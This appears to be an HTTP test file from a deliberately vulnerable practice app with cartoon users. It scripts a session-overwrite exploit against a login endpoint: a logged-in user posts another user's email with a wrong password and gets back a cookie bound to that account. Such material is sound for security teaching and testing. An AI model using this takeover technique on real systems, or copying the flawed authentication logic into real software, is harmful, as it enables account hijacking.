# @import ../_imports.http
# @import ~happy.http

# [VULN] POST /auth/login - Session Overwrite via Login Form
#
# SEVERITY: Critical
# IMPACT: Account takeover - Plankton hijacks SpongeBob's session
#
# THE VULNERABILITY:
# - CustomerAuthenticator tries session cookie first, then credentials
# - If already logged in, authenticate() returns True before checking JSON
# - Handler blindly sets session["email"] = request.json["email"]
# - Logged-in attacker can rebind their session to any email
#
# EXPLOIT STEPS:
# 1. Plankton logs in legitimately and gets a session cookie
# 2. While logged in, Plankton sends login request with SpongeBob's email + wrong password
# 3. Authenticator short-circuits on existing cookie (returns True)
# 4. Handler overwrites session email with SpongeBob's address
# 5. Future requests execute as SpongeBob

### Step 1: Plankton logs in legitimately
# @name plankton_login
{{
  await platform.seed({ plankton: 200, spongebob: 150 });
}}
# @tag auth, r02, v205, vulnerable
POST /auth/login
Content-Type: application/json

{
  "email": "{{user("plankton").email}}",
  "password": "{{user("plankton").password}}"
}

{{
  exports.plankton_cookie = extractCookie(response);
}}
?? js $(response).status() == 200

### Verify: Plankton sees his own account info
# @name verify_plankton_identity
# @forceRef plankton_login
# @ucskip
# @tag auth, r02, v205, vulnerable
GET /account/info
Cookie: {{plankton_cookie}}

?? js $(response).status() == 200
?? js $(response).fieldEquals("email", "plankton@chum-bucket.sea") == true

### Step 2: EXPLOIT - Plankton "logs in" as SpongeBob with wrong password
# @name session_overwrite_exploit
# @forceRef verify_plankton_identity
# @tag auth, r02, v205, vulnerable
POST /auth/login
Cookie: {{plankton_cookie}}
Content-Type: application/json

{
  "email": "{{user("spongebob").email}}",
  "password": "wrong_password_doesnt_matter"
}

{{
  // The server returns a NEW session cookie bound to SpongeBob's email!
  exports.hijacked_cookie = extractCookie(response);
}}
# The authenticator short-circuits on valid cookie - login "succeeds"!
?? js $(response).status() == 200

### Step 3: Verify hijack - The NEW cookie acts as SpongeBob
# @name verify_hijack
# @forceRef session_overwrite_exploit
# @ucskip
# @tag auth, r02, v205, vulnerable
GET /account/info
Cookie: {{hijacked_cookie}}

# VULNERABILITY CONFIRMED: The hijacked cookie returns SpongeBob's data
?? js $(response).status() == 200
?? js $(response).fieldEquals("email", "spongebob@krusty-krab.sea") == true
